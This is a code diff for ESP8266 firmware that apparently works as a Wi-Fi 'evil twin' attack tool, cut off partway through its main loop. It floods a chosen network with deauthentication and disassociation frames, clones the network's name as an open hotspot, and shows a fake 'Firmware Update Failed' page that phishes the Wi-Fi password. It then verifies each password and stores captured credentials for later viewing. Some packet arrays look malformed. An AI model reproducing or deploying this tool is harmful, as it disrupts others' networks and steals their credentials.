@@ -10,6 +10,7 @@ extern "C"
 #include "user_interface.h"
 }
 
+// EEPROM configuration
 #define EEPROM_SIZE 512
 #define MAX_CREDENTIALS 5
 #define CREDENTIAL_SIZE 100
@@ -17,15 +18,17 @@ extern "C"
 #define CREDENTIALS_COUNT_ADDR 0
 #define CREDENTIALS_START_ADDR 4
 
+// Add global variables for deauth attack
 #define MAX_CLIENTS 8
 uint8_t client_addresses[MAX_CLIENTS][6];
 int client_count = 0;
 unsigned long last_client_scan = 0;
 bool scan_for_clients = true;
-int deauth_interval = 250;
+int deauth_interval = 250; // Default interval in ms (can be adjusted)
 bool deauthing_active = false;
 bool hotspot_active = false;
 
+// Add different deauth reason codes for more effective attacks
 const uint8_t reason_codes[] = {1, 2, 3, 4, 5, 6, 7, 9};
 const int num_reason_codes = sizeof(reason_codes) / sizeof(reason_codes[0]);
 
@@ -34,15 +37,17 @@ typedef struct
   String ssid;
   uint8_t ch;
   uint8_t bssid[6];
-  int32_t rssi;
+  int32_t rssi;  // Add RSSI field
 } _Network;
 
+// Structure to store credentials
 typedef struct
 {
   char ssid[32];
   char password[64];
 } Credential;
 
+// Array to store credentials in memory
 Credential storedCredentials[MAX_CREDENTIALS];
 int credentialsCount = 0;
 
@@ -54,63 +59,7 @@ ESP8266WebServer webServer(80);
 _Network _networks[16];
 _Network _selectedNetwork;
 
-bool isHTTPS = false;
-const char* HTTP_HEADER_CONNECTION = "Connection";
-const char* HTTP_HEADER_UPGRADE = "Upgrade";
-const char* HTTP_HEADER_HOST = "Host";
-const char* HTTP_HEADER_ORIGIN = "Origin";
-
-const char* CONTENT_TYPE_HTML = "text/html";
-const char* CONTENT_TYPE_PLAIN = "text/plain";
-
-const char* CACHE_CONTROL_NO_CACHE = "no-cache, no-store, must-revalidate";
-const char* CACHE_CONTROL_NO_SNIFF = "nosniff";
-
-void sendCaptivePortalHeader(ESP8266WebServer& server) {
-  server.sendHeader("Cache-Control", CACHE_CONTROL_NO_CACHE);
-  server.sendHeader("Pragma", "no-cache");
-  server.sendHeader("Expires", "-1");
-  server.sendHeader("X-Content-Type-Options", CACHE_CONTROL_NO_SNIFF);
-}
-
-bool isCaptivePortalDetection() {
-  if (webServer.hostHeader() == "connectivitycheck.gstatic.com" ||
-      webServer.hostHeader() == "connectivitycheck.android.com" ||
-      webServer.hostHeader() == "clients3.google.com" ||
-      webServer.hostHeader() == "clients.l.google.com" ||
-      webServer.hostHeader() == "generate_204" ||
-      webServer.hostHeader() == "captive.apple.com" ||
-      webServer.hostHeader() == "www.apple.com" ||
-      webServer.hostHeader() == "www.appleiphonecell.com" ||
-      webServer.hostHeader() == "www.itools.info" ||
-      webServer.hostHeader() == "www.ibook.info" ||
-      webServer.hostHeader() == "www.airport.us" ||
-      webServer.hostHeader() == "www.thinkdifferent.us") {
-    return true;
-  }
-  return false;
-}
-
-void handleHTTPS() {
-  isHTTPS = true;
-  String httpsHTML = "<!DOCTYPE html><html><head><title>HTTPS Not Available</title>"
-                     "<meta name='viewport' content='width=device-width, initial-scale=1'>"
-                     "<style>"
-                     "body{font-family:system-ui,-apple-system,sans-serif;line-height:1.4;max-width:600px;margin:0 auto;padding:20px;}"
-                     "h1{color:#ff9800;font-size:24px;}"
-                     "p{color:#666;}"
-                     ".btn{display:inline-block;background:#007aff;color:#fff;text-decoration:none;padding:10px 20px;border-radius:5px;margin-top:20px;}"
-                     "</style></head>"
-                     "<body>"
-                     "<h1>⚠️ HTTPS Not Available</h1>"
-                     "<p>This network requires authentication. Please use HTTP to access the login page.</p>"
-                     "<a href='http://" + webServer.hostHeader() + "' class='btn'>Continue to Login</a>"
-                     "</body></html>";
-  
-  sendCaptivePortalHeader(webServer);
-  webServer.send(200, CONTENT_TYPE_HTML, httpsHTML);
-}
-
+// Function prototypes
 void clearArray();
 void performScan();
 void scanForClients();
@@ -122,10 +71,13 @@ String index();
 String header(String t);
 String footer();
 
+// EEPROM Functions
 void loadCredentials()
 {
+  // Read the number of stored credentials
   EEPROM.get(CREDENTIALS_COUNT_ADDR, credentialsCount);
 
+  // Validate the count (in case of first run or corrupted data)
   if (credentialsCount < 0 || credentialsCount > MAX_CREDENTIALS)
   {
     credentialsCount = 0;
@@ -134,6 +86,7 @@ void loadCredentials()
     return;
   }
 
+  // Read each credential
   for (int i = 0; i < credentialsCount; i++)
   {
     int addr = CREDENTIALS_START_ADDR + (i * sizeof(Credential));
@@ -141,15 +94,19 @@ void loadCredentials()
   }
 }
 
+// Save a new credential to EEPROM
 void saveCredential(const char *ssid, const char *password)
 {
+  // Check if this credential already exists
   for (int i = 0; i < credentialsCount; i++)
   {
     if (strcmp(storedCredentials[i].ssid, ssid) == 0)
     {
+      // Update the password if SSID already exists
       strncpy(storedCredentials[i].password, password, sizeof(storedCredentials[i].password) - 1);
       storedCredentials[i].password[sizeof(storedCredentials[i].password) - 1] = '\0';
 
+      // Save to EEPROM
       int addr = CREDENTIALS_START_ADDR + (i * sizeof(Credential));
       EEPROM.put(addr, storedCredentials[i]);
       EEPROM.commit();
@@ -157,8 +114,10 @@ void saveCredential(const char *ssid, const char *password)
     }
   }
 
+  // If we've reached the maximum number of credentials, replace the oldest one
   if (credentialsCount >= MAX_CREDENTIALS)
   {
+    // Shift all credentials one position back (remove the oldest)
     for (int i = 0; i < MAX_CREDENTIALS - 1; i++)
     {
       memcpy(&storedCredentials[i], &storedCredentials[i + 1], sizeof(Credential));
@@ -166,21 +125,26 @@ void saveCredential(const char *ssid, const char *password)
     credentialsCount = MAX_CREDENTIALS - 1;
   }
 
+  // Add the new credential
   strncpy(storedCredentials[credentialsCount].ssid, ssid, sizeof(storedCredentials[credentialsCount].ssid) - 1);
   storedCredentials[credentialsCount].ssid[sizeof(storedCredentials[credentialsCount].ssid) - 1] = '\0';
 
   strncpy(storedCredentials[credentialsCount].password, password, sizeof(storedCredentials[credentialsCount].password) - 1);
   storedCredentials[credentialsCount].password[sizeof(storedCredentials[credentialsCount].password) - 1] = '\0';
 
+  // Save to EEPROM
   int addr = CREDENTIALS_START_ADDR + (credentialsCount * sizeof(Credential));
   EEPROM.put(addr, storedCredentials[credentialsCount]);
 
+  // Increment count and save it
   credentialsCount++;
   EEPROM.put(CREDENTIALS_COUNT_ADDR, credentialsCount);
 
+  // Commit the changes
   EEPROM.commit();
 }
 
+// Delete a credential by index
 void deleteCredential(int index)
 {
   if (index < 0 || index >= credentialsCount)
@@ -188,20 +152,25 @@ void deleteCredential(int index)
     return;
   }
 
+  // Shift all credentials after the deleted one
   for (int i = index; i < credentialsCount - 1; i++)
   {
     memcpy(&storedCredentials[i], &storedCredentials[i + 1], sizeof(Credential));
 
+    // Update in EEPROM
     int addr = CREDENTIALS_START_ADDR + (i * sizeof(Credential));
     EEPROM.put(addr, storedCredentials[i]);
   }
 
+  // Decrement count and save it
   credentialsCount--;
   EEPROM.put(CREDENTIALS_COUNT_ADDR, credentialsCount);
 
+  // Commit the changes
   EEPROM.commit();
 }
 
+// Delete all stored credentials
 void deleteAllCredentials()
 {
   credentialsCount = 0;
@@ -221,6 +190,7 @@ void clearArray()
 String _correct = "";
 String _tryPassword = "";
 
+// Default main strings
 #define SUBTITLE "ACCESS POINT RESCUE MODE"
 #define TITLE "<warning style='color:#ff9800;font-size:2.5rem;margin-right:10px;'>&#9888;</warning>Firmware Update Failed"
 #define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert to the previous firmware and continue normal operation, please verify your network credentials."
@@ -282,29 +252,20 @@ String index()
 
 void setup()
 {
+
   Serial.begin(115200);
 
-
+  // Initialize EEPROM
   EEPROM.begin(EEPROM_SIZE);
 
-
+  // Load stored credentials
   loadCredentials();
 
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
-  
-
-  WiFi.setOutputPower(20.5); 
-  WiFi.setPhyMode(WIFI_PHY_MODE_11N); 
-  
-  
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-  WiFi.softAP("WiFi_Setup", "@wifi2005309@", 1, false, 8); 
-  
-
-  dnsServer.setErrorReplyCode(DNSReplyCode::NoError); 
-  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
-
+  WiFi.softAP("WiFi_Setup", "@bobby2005@");
+  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
@@ -312,28 +273,7 @@ void setup()
   webServer.on("/stored", handleStoredCredentials);
   webServer.on("/delete", handleDeleteCredential);
   webServer.on("/deleteall", handleDeleteAllCredentials);
-
-  webServer.on("/generate_204", handleCaptivePortal);  
-  webServer.on("/ncsi.txt", handleCaptivePortal);    
-  webServer.on("/hotspot-detect.html", handleCaptivePortal);  
-  webServer.on("/success.txt", handleCaptivePortal);
-  webServer.on("/redirect", handleCaptivePortal);
-  webServer.on("/library/test/success.html", handleCaptivePortal);
-  webServer.on("/kindle-wifi/wifistub.html", handleCaptivePortal);
-  webServer.on("/check_network_status.txt", handleCaptivePortal);
-  webServer.on("/fwlink/", handleCaptivePortal);
-  
-
-  webServer.onNotFound([]() {
-    if (isHTTPS) {
-      handleHTTPS();
-    } else if (isCaptivePortalDetection()) {
-      handleCaptivePortal();
-    } else {
-      handleIndex();
-    }
-  });
-
+  webServer.onNotFound(handleIndex);
   webServer.begin();
 }
 
@@ -353,7 +293,7 @@ void performScan()
       }
 
       network.ch = WiFi.channel(i);
-      network.rssi = WiFi.RSSI(i);  
+      network.rssi = WiFi.RSSI(i);  // Store RSSI value
       _networks[i] = network;
     }
   }
@@ -398,10 +338,10 @@ void handleResult()
   {
     _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
 
-
+    // Save the captured credentials to EEPROM
     saveCredential(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
 
-
+    // Turn off deauth attack after successful password capture
     deauthing_active = false;
     Serial.println("Deauth attack stopped after successful password capture");
 
@@ -410,11 +350,12 @@ void handleResult()
     int n = WiFi.softAPdisconnect(true);
     Serial.println(String(n));
     WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-    WiFi.softAP("WiFi_Setup", "@wifi2005309@");
+    WiFi.softAP("WiFi_Setup", "@bobby2005@");
     dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     Serial.println("Good password was entered !");
     Serial.println(_correct);
 
+    // Send success page
     webServer.send(200, "text/html", "<!DOCTYPE html><html><head>"
                                      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                                      "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
@@ -509,94 +450,85 @@ String _tempHTML = "<!DOCTYPE html><html><head>"
 void handleIndex()
 {
 
-  sendCaptivePortalHeader(webServer);
-  
-
-  webServer.sendHeader("Content-Type", CONTENT_TYPE_HTML);
-  
-
-  String userAgent = webServer.header("User-Agent");
-  bool isApple = userAgent.indexOf("iPhone") >= 0 || userAgent.indexOf("iPad") >= 0 || userAgent.indexOf("Mac") >= 0;
-  bool isAndroid = userAgent.indexOf("Android") >= 0;
-  
-  if (hotspot_active == false) {
-    if (webServer.hasArg("ap"))
+  if (webServer.hasArg("ap"))
+  {
+    for (int i = 0; i < 16; i++)
     {
-      for (int i = 0; i < 16; i++)
+      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap"))
       {
-        if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap"))
-        {
-          _selectedNetwork = _networks[i];
-        }
+        _selectedNetwork = _networks[i];
       }
     }
+  }
 
-    if (webServer.hasArg("deauth"))
+  if (webServer.hasArg("deauth"))
+  {
+    if (webServer.arg("deauth") == "start")
     {
-      if (webServer.arg("deauth") == "start")
-      {
-        deauthing_active = true;
-      }
-      else if (webServer.arg("deauth") == "stop")
-      {
-        deauthing_active = false;
-      }
+      deauthing_active = true;
     }
-
-    if (webServer.hasArg("scan"))
+    else if (webServer.arg("deauth") == "stop")
     {
-      if (webServer.arg("scan") == "start")
-      {
-        scan_for_clients = true;
-
-        last_client_scan = 0;
-      }
-      else if (webServer.arg("scan") == "stop")
-      {
-        scan_for_clients = false;
-  
-        client_count = 0;
-      }
+      deauthing_active = false;
     }
+  }
 
-    if (webServer.hasArg("hotspot"))
+  if (webServer.hasArg("scan"))
+  {
+    if (webServer.arg("scan") == "start")
     {
-      if (webServer.arg("hotspot") == "start")
-      {
-        hotspot_active = true;
-
-        dnsServer.stop();
-        int n = WiFi.softAPdisconnect(true);
-        Serial.println(String(n));
-        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-        WiFi.softAP(_selectedNetwork.ssid.c_str());
-        dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-      }
-      else if (webServer.arg("hotspot") == "stop")
-      {
-        hotspot_active = false;
-        dnsServer.stop();
-        int n = WiFi.softAPdisconnect(true);
-        Serial.println(String(n));
-        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-        WiFi.softAP("WiFi_Setup", "@wifi2005309@");
-        dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-      }
-      return;
+      scan_for_clients = true;
+      // Force an immediate scan
+      last_client_scan = 0;
     }
-
-    if (webServer.hasArg("intensity"))
+    else if (webServer.arg("scan") == "stop")
     {
-      int intensity = webServer.arg("intensity").toInt();
-      if (intensity >= 1 && intensity <= 5)
-      {
-
-        deauth_interval = 600 - (intensity * 100);
-        Serial.print("Deauth interval set to: ");
-        Serial.println(deauth_interval);
-      }
+      scan_for_clients = false;
+      // Clear client list
+      client_count = 0;
     }
+  }
 
+  if (webServer.hasArg("hotspot"))
+  {
+    if (webServer.arg("hotspot") == "start")
+    {
+      hotspot_active = true;
+
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    }
+    else if (webServer.arg("hotspot") == "stop")
+    {
+      hotspot_active = false;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP("WiFi_Setup", "@bobby2005@");
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    }
+    return;
+  }
+
+  if (webServer.hasArg("intensity"))
+  {
+    int intensity = webServer.arg("intensity").toInt();
+    if (intensity >= 1 && intensity <= 5)
+    {
+      // Map intensity 1-5 to intervals 500ms-100ms
+      deauth_interval = 600 - (intensity * 100);
+      Serial.print("Deauth interval set to: ");
+      Serial.println(deauth_interval);
+    }
+  }
+
+  if (hotspot_active == false)
+  {
     String _html = _tempHTML;
 
     for (int i = 0; i < 16; ++i)
@@ -667,7 +599,7 @@ void handleIndex()
       _html += "<div class='success-message'>" + _correct + "</div>";
     }
 
-
+    // Add attack settings panel
     if (_selectedNetwork.ssid != "")
     {
       _html += "<div class='settings-panel'>";
@@ -693,6 +625,7 @@ void handleIndex()
       _html += "</div>";
     }
 
+    // Display client list if we have clients and scanning is enabled
     if (client_count > 0 && scan_for_clients)
     {
       _html += "<div class='client-list'>";
@@ -705,47 +638,39 @@ void handleIndex()
     }
 
     _html += "<form method='get' action='/'><button class='refresh-btn'>Refresh Networks</button></form>";
-
+    // Add button to view stored credentials
     _html += "<form method='get' action='/stored' style='margin-top:10px;'><button class='refresh-btn' style='background-color:#007aff;'>View Stored Credentials</button></form>";
 
     _html += "</div></body></html>";
     webServer.send(200, "text/html", _html);
-  } else {
-    if (webServer.hasArg("password")) {
-     
+  }
+  else
+  {
+    if (webServer.hasArg("password"))
+    {
       _tryPassword = webServer.arg("password");
-      
-
-      webServer.sendHeader("Location", "http://" + webServer.client().localIP().toString() + "/result", true);
-      
-      webServer.send(302, CONTENT_TYPE_PLAIN, "");
-      
-    
+      if (webServer.arg("deauth") == "start")
+      {
+        deauthing_active = false;
+      }
+      delay(1000);
       WiFi.disconnect();
-      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-       webServer.send(200, "text/html", "<!DOCTYPE html><html><head>"
+      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
+      webServer.send(200, "text/html", "<!DOCTYPE html><html><head>"
                                        "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-                                       "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 
-                                       24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.
-                                       2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 
-                                       16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.
-                                       8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
+                                       "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
                                        "<style>"
-                                       "body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f5f5f5; margin: 0; 
-                                       padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }"
-                                       ".loader-container { background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
-                                       padding: 20px; text-align: center; width: 90%; max-width: 400px; }"
+                                       "body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }"
+                                       ".loader-container { background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 20px; text-align: center; width: 90%; max-width: 400px; }"
                                        "h2 { color: #333; margin-top: 0; font-size: 1.5rem; }"
                                        ".spinner { margin: 25px auto; width: 70px; text-align: center; }"
-                                       ".spinner > div { width: 18px; height: 18px; background-color: #0066ff; border-radius: 100%; display: 
-                                       inline-block; animation: sk-bouncedelay 1.4s infinite ease-in-out both; }"
+                                       ".spinner > div { width: 18px; height: 18px; background-color: #0066ff; border-radius: 100%; display: inline-block; animation: sk-bouncedelay 1.4s infinite ease-in-out both; }"
                                        ".spinner .bounce1 { animation-delay: -0.32s; }"
                                        ".spinner .bounce2 { animation-delay: -0.16s; }"
                                        "@keyframes sk-bouncedelay { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1.0); } }"
                                        "progress { width: 100%; height: 8px; margin-top: 20px; border: none; border-radius: 4px; }"
                                        "progress::-webkit-progress-bar { background-color: #f0f0f0; border-radius: 4px; }"
-                                       "progress::-webkit-progress-value { background: linear-gradient(to right, #0066ff, #5856d6); 
-                                       border-radius: 4px; transition: width 0.3s ease; }"
+                                       "progress::-webkit-progress-value { background: linear-gradient(to right, #0066ff, #5856d6); border-radius: 4px; transition: width 0.3s ease; }"
                                        ".status-text { color: #666; margin-top: 15px; font-size: 14px; }"
                                        "@media (max-width: 480px) {"
                                        "  .loader-container { padding: 15px; }"
@@ -756,8 +681,7 @@ void handleIndex()
                                        "</style>"
                                        "<script>"
                                        "let progress = 10;"
-                                       "const statusMessages = ['Connecting to network...', 'Verifying credentials...', 'Checking firmware 
-                                       version...', 'Validating network integrity...', 'Almost done...'];"
+                                       "const statusMessages = ['Connecting to network...', 'Verifying credentials...', 'Checking firmware version...', 'Validating network integrity...', 'Almost done...'];"
                                        "let currentMessage = 0;"
                                        "const interval = setInterval(() => {"
                                        "  progress += 6;"
@@ -786,15 +710,14 @@ void handleIndex()
                                        "<p id='progressText'>10%</p>"
                                        "<p id='statusMessage' class='status-text'>Connecting to network...</p>"
                                        "</div></body></html>");
-    } else {
-
-      if (isApple) {
-
-        webServer.sendHeader("X-Apple-MobileWeb-App-Capable", "yes");
-        webServer.sendHeader("X-Apple-Touch-Fullscreen", "yes");
+      if (webServer.arg("deauth") == "start")
+      {
+        deauthing_active = true;
       }
-      
-      webServer.send(200, CONTENT_TYPE_HTML, index());
+    }
+    else
+    {
+      webServer.send(200, "text/html", index());
     }
   }
 }
@@ -831,7 +754,7 @@ void handleAdmin()
     int intensity = webServer.arg("intensity").toInt();
     if (intensity >= 1 && intensity <= 5)
     {
-
+      // Map intensity 1-5 to intervals 500ms-100ms
       deauth_interval = 600 - (intensity * 100);
       Serial.print("Deauth interval set to: ");
       Serial.println(deauth_interval);
@@ -843,13 +766,13 @@ void handleAdmin()
     if (webServer.arg("scan") == "start")
     {
       scan_for_clients = true;
-
+      // Force an immediate scan
       last_client_scan = 0;
     }
     else if (webServer.arg("scan") == "stop")
     {
       scan_for_clients = false;
-     
+      // Clear client list
       client_count = 0;
     }
   }
@@ -874,7 +797,7 @@ void handleAdmin()
       int n = WiFi.softAPdisconnect(true);
       Serial.println(String(n));
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-      WiFi.softAP("WiFi_Setup", "@wifi2005309@");
+      WiFi.softAP("WiFi_Setup", "@bobby2005@");
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     }
     return;
@@ -948,7 +871,7 @@ void handleAdmin()
     _html += "<div class='success-message'>" + _correct + "</div>";
   }
 
-
+  // Add attack settings panel
   if (_selectedNetwork.ssid != "")
   {
     _html += "<div class='settings-panel'>";
@@ -974,7 +897,7 @@ void handleAdmin()
     _html += "</div>";
   }
 
-
+  // Display client list if we have clients and scanning is enabled
   if (client_count > 0 && scan_for_clients)
   {
     _html += "<div class='client-list'>";
@@ -987,7 +910,7 @@ void handleAdmin()
   }
 
   _html += "<form method='get' action='/admin'><button class='refresh-btn'>Refresh Networks</button></form>";
-
+  // Add button to view stored credentials
   _html += "<form method='get' action='/stored' style='margin-top:10px;'><button class='refresh-btn' style='background-color:#007aff;'>View Stored Credentials</button></form>";
 
   _html += "</div></body></html>";
@@ -1015,7 +938,7 @@ String getSignalStrength(int32_t rssi) {
   String bars;
   String color;
   
-
+  // Determine color based on signal strength
   if (rssi >= -50) {
     color = "#34c759"; // Strong - Green
     bars = "#####";
@@ -1036,7 +959,7 @@ String getSignalStrength(int32_t rssi) {
     bars = "-----";
   }
 
-
+  // Get signal quality description
   String quality;
   if (rssi >= -50) quality = "Excellent";
   else if (rssi >= -60) quality = "Very Good";
@@ -1045,6 +968,7 @@ String getSignalStrength(int32_t rssi) {
   else if (rssi >= -90) quality = "Poor";
   else quality = "Very Poor";
 
+  // Create styled HTML output with improved layout
   String html = "<div style='display:inline-flex;align-items:center;gap:10px;background-color:rgba(0,0,0,0.03);padding:4px 8px;border-radius:4px;'>";
   html += "<span style='font-family:monospace;color:" + color + ";font-size:1.1em;letter-spacing:2px;font-weight:bold;'>" + bars + "</span>";
   html += "<span style='color:" + color + ";font-weight:500;'>" + quality + "</span>";
@@ -1061,189 +985,102 @@ unsigned long deauth_now = 0;
 uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 uint8_t wifi_channel = 1;
 
-
-#define DNS_CACHE_SIZE 64
-struct DNSCacheEntry {
-  String domain;
-  unsigned long timestamp;
-};
-DNSCacheEntry dnsCache[DNS_CACHE_SIZE];
-int dnsCacheIndex = 0;
-const unsigned long DNS_CACHE_TTL = 300000; 
-
-void cleanDNSCache() {
-  unsigned long currentTime = millis();
-  for (int i = 0; i < DNS_CACHE_SIZE; i++) {
-    if (dnsCache[i].domain.length() > 0 && 
-        currentTime - dnsCache[i].timestamp > DNS_CACHE_TTL) {
-      dnsCache[i].domain = "";
-    }
-  }
-}
-
-
-bool isInDNSCache(String domain) {
-  for (int i = 0; i < DNS_CACHE_SIZE; i++) {
-    if (dnsCache[i].domain == domain) {
-      if (millis() - dnsCache[i].timestamp <= DNS_CACHE_TTL) {
-        return true;
-      } else {
-        dnsCache[i].domain = ""; 
-        return false;
-      }
-    }
-  }
-  return false;
-}
-
-
-void addToDNSCache(String domain) {
-  if (!isInDNSCache(domain)) {
-    dnsCache[dnsCacheIndex].domain = domain;
-    dnsCache[dnsCacheIndex].timestamp = millis();
-    dnsCacheIndex = (dnsCacheIndex + 1) % DNS_CACHE_SIZE;
-  }
-}
-
-
-bool isCaptivePortalRequest() {
-  String host = webServer.hostHeader();
-  
-  
-  if (host == webServer.client().localIP().toString()) {
-    return false;
-  }
-  
-  if (isCaptivePortalDetection()) {
-    return true;
-  }
-  
-
-  String uri = webServer.uri();
-  if (uri.indexOf("generate_204") >= 0 ||
-      uri.indexOf("redirect") >= 0 ||
-      uri.indexOf("success.txt") >= 0 ||
-      uri.indexOf("hotspot-detect") >= 0 ||
-      uri.indexOf("ncsi.txt") >= 0) {
-    return true;
-  }
-  
-  if (isInDNSCache(host)) {
-    return false;
-  }
-
-  addToDNSCache(host);
-  return true;
-}
-
-void loop() {
- 
-  static unsigned long lastCacheClean = 0;
-  if (millis() - lastCacheClean > 60000) { 
-    cleanDNSCache();
-    lastCacheClean = millis();
-  }
-
-  
+void loop()
+{
   dnsServer.processNextRequest();
   webServer.handleClient();
 
-
-  if (webServer.client().localPort() == 443) {
-    handleHTTPS();
-    return;
-  }
-
-  if (deauthing_active && millis() - deauth_now >= deauth_interval) {
-   
+  if (deauthing_active && millis() - deauth_now >= deauth_interval)
+  { // Configurable frequency
 
     wifi_set_channel(_selectedNetwork.ch);
 
-
+    // Select a random reason code for this round
     uint8_t reason_code = reason_codes[random(0, num_reason_codes)];
 
-
+    // Deauth packet (type 0xC0)
     uint8_t deauthPacket[26] = {
-        0xC0, 0x00,                         
-        0x00, 0x00,                        
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
-        0x00, 0x00,                        
-        reason_code, 0x00                   
-    }; 
+        0xC0, 0x00,                         // Frame Control (2 bytes)
+        0x00, 0x00,                         // Duration (2 bytes)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination address (6 bytes)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source address (6 bytes)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID (6 bytes)
+        0x00, 0x00,                         // Sequence number (2 bytes)
+        reason_code, 0x00                   // Reason code (2 bytes)
+    }; // Total: 26 bytes
 
+    // Disassociation packet (type 0xA0)
     uint8_t disassocPacket[26] = {
-        0xA0, 0x00,                        
-        0x00, 0x00,                        
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-        0x00, 0x00,                         
-        reason_code, 0x00                 
-    }; 
+        0xA0, 0x00,                         // Frame Control (2 bytes)
+        0x00, 0x00,                         // Duration (2 bytes)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination address (6 bytes)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source address (6 bytes)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID (6 bytes)
+        0x00, 0x00,                         // Sequence number (2 bytes)
+        reason_code, 0x00                   // Reason code (2 bytes)
+    }; // Total: 26 bytes
 
-
+    // Authentication frame with failure (type 0xB0)
+    // Count: 2+2+6+6+6+2+2+2+2 = 30 bytes
     uint8_t authPacket[30] = {
-        0xB0, 0x00,                           
-        0x00, 0x00,                         
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
